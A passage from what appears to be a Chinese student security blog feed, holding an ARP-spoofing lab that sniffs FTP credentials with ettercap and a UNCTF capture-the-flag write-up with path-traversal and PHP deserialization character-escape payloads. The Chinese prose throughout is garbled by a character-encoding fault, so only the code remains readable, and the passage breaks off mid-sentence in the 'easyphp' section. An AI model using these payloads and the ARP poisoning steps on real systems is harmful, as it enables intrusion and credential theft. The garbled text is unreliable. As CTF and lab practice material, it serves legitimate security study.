rel="noopener">é€šä¿¡</a>å®‰å…¨ã€‚å½“å±€åŸŸç½‘å†…çš„è®¡ç®—æœºé­åˆ°ARPçš„æ”»å‡»æ—¶ï¼Œå®ƒå°±ä¼šæŒç»­åœ°å‘å±€åŸŸç½‘å†…æ‰€æœ‰çš„è®¡ç®—æœºåŠç½‘ç»œé€šä¿¡è®¾å¤‡å‘é€å¤§é‡çš„ARPæ¬ºéª—æ•°æ®åŒ…ï¼Œå¦‚æœä¸åŠæ—¶å¤„ç†ï¼Œä¾¿ä¼šé€ æˆç½‘ç»œé€šé“é˜»å¡ã€ç½‘ç»œè®¾å¤‡çš„æ‰¿è½½è¿‡é‡ã€ç½‘ç»œçš„é€šè®¯è´¨é‡ä¸ä½³ç­‰æƒ…å†µã€‚</p><h2 id="æ”»å‡»åŸç†"><a href="#æ”»å‡»åŸç†" class="headerlink" title="æ”»å‡»åŸç†"></a>æ”»å‡»åŸç†</h2><p>ARPæ”»å‡»ä¸»è¦æ˜¯é€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€è¿›è¡Œæ¬ºéª—ã€‚ä½¿ä»¥å¤ªç½‘æ•°æ®åŒ…çš„æºåœ°å€ã€ç›®æ ‡åœ°å€å’ŒARPé€šä¿¡æ•°é‡å‰§å¢å¯¼è‡´ç½‘ç»œä¸­æ–­æˆ–ä¸­é—´äººæ”»å‡»ã€‚ARPæ”»å‡»ä¸»è¦å­˜åœ¨äºå±€åŸŸç½‘ä¸­ã€‚è‹¥å…¶ä¸­ä¸€å°è®¡ç®—æœºæ„ŸæŸ“ARPç—…æ¯’ã€‚å°±ä¼šè¯•å›¾é€šè¿‡ARPæ¬ºéª—æˆªè·å±€åŸŸç½‘å†…å…¶ä»–è®¡ç®—æœºçš„ä¿¡æ¯ï¼Œé€ æˆå±€åŸŸç½‘å†…çš„è®¡ç®—æœºé€šä¿¡æ•…éšœã€‚</p><h2 id="å®éªŒæœºå™¨"><a href="#å®éªŒæœºå™¨" class="headerlink" title="å®éªŒæœºå™¨"></a>å®éªŒæœºå™¨</h2><p>2003è™šæ‹Ÿæœºï¼Œä½œä¸ºftpæœåŠ¡å™¨</p><p>xpè™šæ‹Ÿæœºä½œä¸ºç”¨æˆ·è®¿é—®ftpæœåŠ¡</p><p>kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œè·å–xpç™»å½•æ—¶çš„è´¦å·å¯†ç </p><p>xp:10.1.1.3/24</p><p>2003:10.1.1.1/24</p><p>kali:10.1.1.2/24</p><h2 id="å®éªŒæ‹“æ‰‘å›¾"><a href="#å®éªŒæ‹“æ‰‘å›¾" class="headerlink" title="å®éªŒæ‹“æ‰‘å›¾"></a>å®éªŒæ‹“æ‰‘å›¾</h2><p><img src="https://i.loli.net/2020/11/27/BCE6m9cM5pzrFhL.png" srcset="/img/loading.gif" alt="1.png"></p><h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="ä¸€-æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ"><a href="#ä¸€-æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ" class="headerlink" title="ä¸€.æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ"></a>ä¸€.æ£€æŸ¥ä¸‰å°ä¸»æœºçš„é€šä¿¡æƒ…å†µ</h3><p>ä¸‰å°ä¸»æœºé€šä¿¡æ­£å¸¸</p><h3 id="äºŒ-2003å¼€å¯ftpæœåŠ¡å™¨"><a href="#äºŒ-2003å¼€å¯ftpæœåŠ¡å™¨" class="headerlink" title="äºŒ.2003å¼€å¯ftpæœåŠ¡å™¨"></a>äºŒ.2003å¼€å¯ftpæœåŠ¡å™¨</h3><p>å¼€å¯ftpæœåŠ¡ï¼Œå¹¶è®¾ç½®ç¦æ­¢åŒ¿åè®¿é—®</p><p>å¹¶åˆ›å»ºxpè®¿é—®æ—¶éœ€è¦çš„ä½¿ç”¨çš„è´¦å·</p><div class="hljs"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>aaa<span class="hljs-symbol">password:</span><span class="hljs-number">123.</span><span class="hljs-keyword">com</span></code></pre></div><p>éªŒè¯æ˜¯å¯ä»¥æ­£å¸¸è®¿é—®çš„</p><h3 id="ä¸‰-kaliæ‰“å¼€æ”»å‡»è½¯ä»¶"><a href="#ä¸‰-kaliæ‰“å¼€æ”»å‡»è½¯ä»¶" class="headerlink" title="ä¸‰.kaliæ‰“å¼€æ”»å‡»è½¯ä»¶"></a>ä¸‰.kaliæ‰“å¼€æ”»å‡»è½¯ä»¶</h3><p>æ‰“å¼€ettercap-&gt;undefined sniffing-&gt;eth0-&gt;Host-&gt;scan host-&gt;add-&gt;arp posioning-&gt;é€‰æ‹©ç¬¬ä¸€é¡¹</p><p>æ‰«æåˆ°ä¸¤å°ç›®æ ‡ä¸»æœºï¼Œå¼€å§‹arpæŠ•æ¯’</p><p><img src="https://i.loli.net/2020/11/27/Xos23uSIPQxkiqT.png" srcset="/img/loading.gif" alt="arp-2.png"></p><p>æ­¤æ—¶arpæ”»å‡»å·²ç»å¼€å§‹äº†</p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªä¸åŒçš„IPå¯¹åº”çš„ç¡®å®åŒä¸€macåœ°å€ï¼Œå½“è‡ªå·±çš„ç”µè„‘å‡ºç°è¿™ç§æƒ…å†µæ—¶å°±å¯ä»¥åˆ¤æ–­æ˜¯arpæ”»å‡»äº†</p><h3 id="å››-xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç "><a href="#å››-xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç " class="headerlink" title="å››.xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç "></a>å››.xpè®¿é—®ftpæœåŠ¡å™¨ï¼ŒkaliæŠ“å–åˆ°è´¦å·å¯†ç </h3><p>å¼€å§‹ç¬¬å››æ­¥</p><p>xpè®¿é—®ftpå¹¶è¾“å…¥è´¦å·å¯†ç </p><p>kalié‚£è¾¹å·²ç»æŠ“å–åˆ°</p><p><img src="https://i.loli.net/2020/11/27/CuI1ovGWZz9tEUp.png" srcset="/img/loading.gif" alt="arp-3.png"></p><h2 id="å®éªŒç»“æŸ"><a href="#å®éªŒç»“æŸ" class="headerlink" title="å®éªŒç»“æŸ"></a>å®éªŒç»“æŸ</h2><p>arpæ”»å‡»çš„å¦å¤–ä¸€ç§å½¢å¼æ˜¯åˆ©ç”¨ARPæ¬ºéª—ï¼Œé€ æˆå±€åŸŸç½‘å†…ä¸»æœºé€šä¿¡çš„å¤±è´¥ï¼Œå°±æ˜¯æ— æ³•è¿æ¥ç½‘ç»œã€‚å®ç°æ–¹æ³•æ¯”è¾ƒç®€å•å°±ä¸å†èµ˜è¿°ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>arp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UNCTF</title>
    <link href="/2020/11/17/UNCTF/"/>
    <url>/2020/11/17/UNCTF/</url>
    
    <content type="html"><![CDATA[<p>æ¯”èµ›å’Œè€ƒè¯•æ—¶é—´æœ‰ç‚¹å†²çªï¼Œä¹Ÿæ²¡æœ‰å¥½å¥½åšé¢˜ï¼Œåªå¥½ç»“æŸå¤ç°ä¸€ä¸‹ã€‚</p><a id="more"></a><h3 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">echo</span><span class="hljs-string">'&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;'</span>;highlight_file(<span class="hljs-keyword">__FILE__</span>);$url = $_GET[<span class="hljs-string">'url'</span>];<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">'/unctf\.com/'</span>,$url))&#123;    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">'/php|file|zip|bzip|zlib|base|data/i'</span>,$url))&#123;        $url=file_get_contents($url);        <span class="hljs-keyword">echo</span>($url);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span>(<span class="hljs-string">'error!!'</span>);    &#125;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-string">"error"</span>);&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>çœ‹ä¸‹ä»£ç å‘ç°è¿‡æ»¤äº†å¤§éƒ¨åˆ†åè®®åï¼Œä¸€å¼€å§‹ä¸€ç›´ä»¥ä¸ºæ˜¯ä½¿ç”¨ç‰¹æ®Šç¼–ç ç»•è¿‡ç»“æœè¡Œä¸é€š</p><p>åæ¥æ‰çŸ¥é“è€ƒç‚¹æ ¹æœ¬ä¸ç»•è¿‡ã€‚</p><p>payloadï¼š</p><div class="hljs"><pre><code class="hljs coffeescript">?file=unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../../flag<span class="hljs-regexp">//</span>ä¸å”¯ä¸€?file=():unctf.com<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>../flag<span class="hljs-regexp">//</span>()é‡Œå¯ä»¥å¡«ä»»æ„å­—ç¬¦é™¤äº†æ­£åˆ™è¿‡æ»¤çš„å‡ ä¸ªåè®®</code></pre></div><p><strong>åŸç†ï¼š</strong>å½“phpé‡åˆ°ä¸€ä¸ªä¸è®¤è¯†çš„protocolæ—¶ï¼Œä¼šæŠ›å‡ºä¸€ä¸ªwarningï¼Œå¹¶å°†protocolè®¾ç½®ä¸ºnull,åœ¨protocoä¸ºnullæˆ–fileæ—¶ï¼Œåˆ™è¿›è¡Œæœ¬åœ°æ“ä½œã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä¼ åè®®æˆ–ä¼ å…¥äº†ä¸å­˜åœ¨åè®®ï¼Œä¼šè¿›è¡Œæœ¬åœ°æ–‡ä»¶æ“ä½œã€‚</p><h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><p><strong>è€ƒå¯Ÿç‚¹æ˜¯ååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸</strong></p><p>å…ˆå†²ç®€å•çš„PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸äº†è§£ä»€ä¹ˆæ˜¯ååºåŒ–é€ƒé€¸ã€‚</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'aaaa'</span>;    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;&#125;$AA=<span class="hljs-keyword">new</span> A();$res=filter(serialize($AA));$c=unserialize($res);<span class="hljs-keyword">echo</span> $c-&gt;pass;<span class="hljs-meta">?&gt;</span></code></pre></div><p>åˆ©ç”¨ååºåˆ—åŒ–é€ƒé€¸ä¿®æ”¹passçš„å€¼ã€‚</p><p>æ­£å¸¸çš„åºåˆ—åŒ–ç»“æœ</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div><p><code>s:4:&quot;aaaa&quot;</code>såé¢çš„æ•°å­—è¡¨ç¤ºå˜é‡çš„é•¿åº¦ï¼Œphpæ‰§è¡Œçš„æ—¶å€™ä¼šæ ¹æ®å…¶é•¿åº¦è¯»å–æ•°æ®ï¼Œå¦‚æœä¸ç¬¦åˆè§„åˆ™åˆ™ä¼šååºåˆ—åŒ–å¤±è´¥ã€‚</p><p>ä¾‹å¦‚</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"A"</span><span class="hljs-selector-pseudo">:2</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"aaaa"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"pass"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;&#125;</code></pre></div><p>å°†4æ”¹ä¸º5ï¼Œé‚£ä¹ˆåˆ™è®¤ä¸ºnameçš„å€¼ä¸º <code>aaaa&quot;</code>,æ­¤æ—¶å› ä¸ºå‰é¢çš„â€æ— æ³•é—­åˆè€Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚</p><p><img src="https://i.loli.net/2020/11/18/Ctefk8iKXP34Gmn.png" srcset="/img/loading.gif" alt="error.png"></p><p>è€Œä¸Šé¢çš„ç¨‹åºä¸­å­˜åœ¨ä¸€ä¸ªæ›¿æ¢å‡½æ•°ï¼Œåªè¦nameä¸­å­˜åœ¨bbåˆ™å°†å…¶æ›¿æ¢ä¸ºcccï¼Œå¯¼è‡´nameå­—æ®µçš„é•¿åº¦ä¼šå¢åŠ 1ï¼Œæˆ‘ä»¬å°†é€ƒé€¸çš„å­—ç¬¦ä¸²çš„é•¿åº¦å¡«å……æˆæˆ‘ä»¬è¦ååºåˆ—åŒ–çš„ä»£ç çš„è¯é‚£å°±å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–çš„ç»“æœä»¥åŠç±»é‡Œé¢çš„å˜é‡å€¼äº†ã€‚é‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°æ¥æ„é€ å‡ºæƒ³è¦çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</p><p>ä¾‹å¦‚æƒ³å°†passå˜é‡çš„åºåˆ—åŒ–å­—ç¬¦ä¸²å¦‚ä¸‹</p><div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"pass"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:6</span><span class="hljs-selector-pseudo">:"hacker"</span>;&#125;</code></pre></div><p>å…¶ä¸­ å‰é¢çš„ â€œ;æ˜¯ä¸ºäº†é—­åˆçš„å˜é‡çš„â€ï¼Œä¿è¯è¯­æ³•æ­£ç¡®ï¼Œ}çš„ä½œç”¨æ˜¯åºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æŸçš„æ ‡å¿—</p><p>ä¸Šé¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º27ï¼Œæ‰€ä»¥å°±éœ€è¦27ä¸ªbbæ¥äº§ç”Ÿ27ä¸ªå­—ç¬¦é•¿åº¦çš„é€ƒé€¸</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span></span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'bb'</span>, <span class="hljs-string">'ccc'</span>, $str);&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;    <span class="hljs-keyword">public</span> $name=<span class="hljs-string">'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;'</span>;    <span class="hljs-keyword">public</span> $pass=<span class="hljs-string">'123456'</span>;&#125;$AA=<span class="hljs-keyword">new</span> A();var_dump(serialize($AA));$res=filter(serialize($AA));var_dump($res);$c=unserialize($res);<span class="hljs-keyword">echo</span> $c-&gt;pass;<span class="hljs-comment">//echo unserialize($AA);</span><span class="hljs-comment">//";s:4:"pass";s:6:"hacker";&#125;</span><span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">//ç»“æœå¦‚ä¸‹   ||ä¸ºå¯¹é½</span><span class="hljs-comment">/*</span><span class="hljs-comment">string(136) "O:1:"A":2:&#123;s:4:"name";s:81:"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb";s:4:"pass";s:6:"hacker";&#125;";s:4:"pass";s:6:"123456";&#125;"||</span><span class="hljs-comment">string(163) "O:1:"A":2:&#123;s:4:"name";s:81:"ccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc";s:4:"pass";s:6:"hacker";&#125;"||;s:4:"pass";s:6:"123456";&#125;"</span><span class="hljs-comment">hacker</span><span class="hljs-comment">*/</span></code></pre></div><p><img src="https://i.loli.net/2020/11/18/qgC18vQGcElFy2e.png" srcset="/img/loading.gif" alt="success.png"></p><p>è¿™é‡Œpassçš„å€¼å°±è¢«è¯¥ç§°äº†hacker</p><p>æ€»ç»“ï¼š<strong>é€ƒé€¸æˆ–è€…è¯´è¢«â€œé¡¶â€å‡ºæ¥çš„payloadå°±ä¼šè¢«å½“åšå½“å‰ç±»çš„å±æ€§è¢«æ‰§è¡Œã€‚</strong></p><p><a href="https://www.cnblogs.com/Sumarua/p/12932401.html" target="_blank" rel="noopener">å‚è€ƒ</a></p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>error_reporting(<span class="hljs-number">0</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $uname;    <span class="hljs-keyword">public</span> $password;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($uname,$password)</span></span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;uname=$uname;        <span class="hljs-keyword">$this</span>-&gt;password=$password;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;password===<span class="hljs-string">'easy'</span>)            &#123;                <span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);                <span class="hljs-keyword">echo</span> $flag;                &#125;            <span class="hljs-keyword">else</span>            &#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">'wrong password'</span>;            &#125;        &#125;    &#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);&#125;$uname=$_GET[<span class="hljs-number">1</span>];$password=<span class="hljs-number">1</span>;$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));$test=unserialize($ser);<span class="hljs-meta">?&gt;</span></code></pre></div><p>è¿™æ®µä»£ç çš„æ„æ€å¤§è‡´ä¸ºï¼Œgetæ–¹å¼æäº¤ä¸€ä¸ª1ï¼Œä¹‹åç”Ÿæˆä¸€ä¸ªåºåˆ—åŒ–å­—ç¬¦ä¸²å¹¶å°†å­—ç¬¦ä¸²ä¸­çš„challengeæ¢æˆeasychallengeï¼Œå­—ç¬¦é•¿åº¦å¢åŠ 4ï¼Œå½“å¯†ç ä¸ºeasyæ—¶ï¼Œå¾—åˆ°flagã€‚è¿™é¢˜çœ‹ä¸Šå»ä¸ä¸Šé¢çš„ä¾‹å­å·®ä¸å¤šï¼Œä½†æ˜¯æ„é€ çš„æ—¶å€™å‘ç°å¹¶ä¸æ˜¯</p><p>éœ€è¦æ„é€ çš„å±æ€§</p><div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;&#125;</code></pre></div><p>å¯ä»¥å‘ç°ä¸Šé¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¸º29ï¼Œè€Œæ¯æ›¿æ¢ä¸€ä¸ªchallengeåªèƒ½é€ƒé€¸å‡º4ä¸ªå­—ç¬¦ï¼Œä¸èƒ½æ„é€ å‡º29ï¼Œå› æ­¤è¿™é‡Œéœ€è¦å†æ„é€ å‡ºä¸€ä¸ªå±æ€§ï¼Œä½¿ä¸Šé¢çš„å­—ç¬¦ä¸²çš„é•¿åº¦ä¸º4çš„å€æ•°ã€‚</p><div class="hljs"><pre><code class="hljs css">";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div><p>ä¸Šé¢æ„é€ å‡ºçš„payloadé•¿åº¦ä¸º48å› æ­¤è¿˜éœ€è¦12ä¸ªchallengeã€‚</p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $uname=<span class="hljs-string">'challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge";s:8:"password";s:4:"easy";s:4:"aaaa";s:1:"a";&#125;'</span>;    <span class="hljs-keyword">public</span> $password=<span class="hljs-string">"1"</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($string)</span></span>&#123;    <span class="hljs-keyword">return</span> str_replace(<span class="hljs-string">'challenge'</span>,<span class="hljs-string">'easychallenge'</span>,$string);&#125;$ser=filter(serialize(<span class="hljs-keyword">new</span> a($uname,$password)));<span class="hljs-keyword">echo</span>($ser);<span class="hljs-meta">?&gt;</span></code></pre></div><div class="hljs"><pre><code class="hljs scss">O:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">"uname"</span>;s:<span class="hljs-number">156</span>:<span class="hljs-string">"easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"easy"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"aaaa"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"a"</span>;&#125;";s:<span class="hljs-number">8</span>:<span class="hljs-string">"password"</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"1"</span>;&#125;<span class="hljs-comment">//easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge  é•¿åº¦ä¸º156</span></code></pre></div><p>finalpayloadï¼š</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">challengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallengechallenge</span>";<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"password"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"easy"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:4</span><span class="hljs-selector-pseudo">:"aaaa"</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:1</span><span class="hljs-selector-pseudo">:"a"</span>;&#125;</code></pre></div><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>ç»™äº†æç¤º  /sourceæŸ¥çœ‹æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$adminPassword = <span class="hljs-string">'d8b8caf4df69a81f2815pbcb74cd73ab'</span>;<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'fuxkSQL'</span>)) &#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fuxkSQL</span><span class="hljs-params">($iText)</span>    </span><span class="hljs-function">    </span>&#123;        $oText = $iText;        $oText = str_replace(<span class="hljs-string">'\\\\'</span>, <span class="hljs-string">'\\'</span>, $oText);        $oText = str_replace(<span class="hljs-string">'\"'</span>, <span class="hljs-string">'"'</span>, $oText);        $oText = str_replace(<span class="hljs-string">"\'"</span>, <span class="hljs-string">"'"</span>, $oText);        $oText = str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"''"</span>, $oText);        <span class="hljs-keyword">return</span> $oText;    &#125;&#125;<span class="hljs-keyword">if</span> (!function_exists(<span class="hljs-string">'getVars'</span>)) &#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getVars</span><span class="hljs-params">()</span></span><span class="hljs-function">    </span>&#123;        $totals = array_merge($_GET, $_POST);        <span class="hljs-keyword">if</span> (count($_GET)) &#123;            <span class="hljs-keyword">foreach</span> ($_GET <span class="hljs-keyword">as</span> $key =&gt; $value) &#123;                <span class="hljs-keyword">global</span> $&#123;$key&#125;;                <span class="hljs-keyword">if</span> (is_array($value)) &#123;                    $temp_array = <span class="hljs-keyword">array</span>();                    <span class="hljs-keyword">foreach</span> ($value <span class="hljs-keyword">as</span> $key2 =&gt; $value2) &#123;                        <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;                            $temp_array[$key2] = fuxkSQL(trim($value2));                        &#125; <span class="hljs-keyword">else</span> &#123;                            $temp_array[$key2] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value2))));                        &#125;                    &#125;                    $&#123;$key&#125; = $_GET[$key] = $temp_array;                &#125; <span class="hljs-keyword">else</span> &#123;                    <span class="hljs-keyword">if</span> (function_exists(<span class="hljs-string">'mysql_real_escape_string'</span>)) &#123;                        $&#123;$key&#125; = fuxkSQL(trim($value));                    &#125; <span class="hljs-keyword">else</span> &#123;                        $&#123;$key&#125; = $_GET[$key] = str_replace(<span class="hljs-string">'"'</span>, <span class="hljs-string">'\"'</span>, str_replace(<span class="hljs-string">"'"</span>, <span class="hljs-string">"\'"</span>, (trim($value))));                    &#125;                &#125;            &#125;        &#125;    &#125;&#125;getVars();<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($source)) &#123;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;<span class="hljs-comment">//åªæœ‰adminæ‰èƒ½è®¾ç½®ç¯å¢ƒå˜é‡</span><span class="hljs-keyword">if</span> (md5($password) === $adminPassword &amp;&amp; sha1($verif) == $verif) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">'you can set config variables!!'</span> . <span class="hljs-string">'&lt;/br&gt;'</span>;    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key) &amp;&amp; strlen($GLOBALS[$key]) &lt; <span class="hljs-number">12</span>) &#123;            @<span class="hljs-keyword">eval</span>(<span class="hljs-string">"\$$key"</span> . <span class="hljs-string">'="'</span> . $GLOBALS[$key] . <span class="hljs-string">'";'</span>);        &#125;    &#125;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">foreach</span> (array_keys($GLOBALS) <span class="hljs-keyword">as</span> $key) &#123;        <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">'/var\d&#123;1,2&#125;/'</span>, $key)) &#123;            <span class="hljs-keyword">echo</span> ($GLOBALS[$key]) . <span class="hljs-string">'&lt;/br&gt;'</span>;        &#125;    &#125;&#125;</code></pre></div><p>ä»£ç å¾ˆé•¿ï¼Œä½†æ˜¯å¾ˆå®¹æ˜“ç†è§£ </p><p>fuxkSQLæ˜¯å°†å¯èƒ½å­˜åœ¨sqlæ³¨å…¥çš„ç¬¦å·è½¬ä¹‰</p><p>getvarhæ˜¯å°†ä¼ çš„å‚æ•°èµ‹å€¼</p><p>global 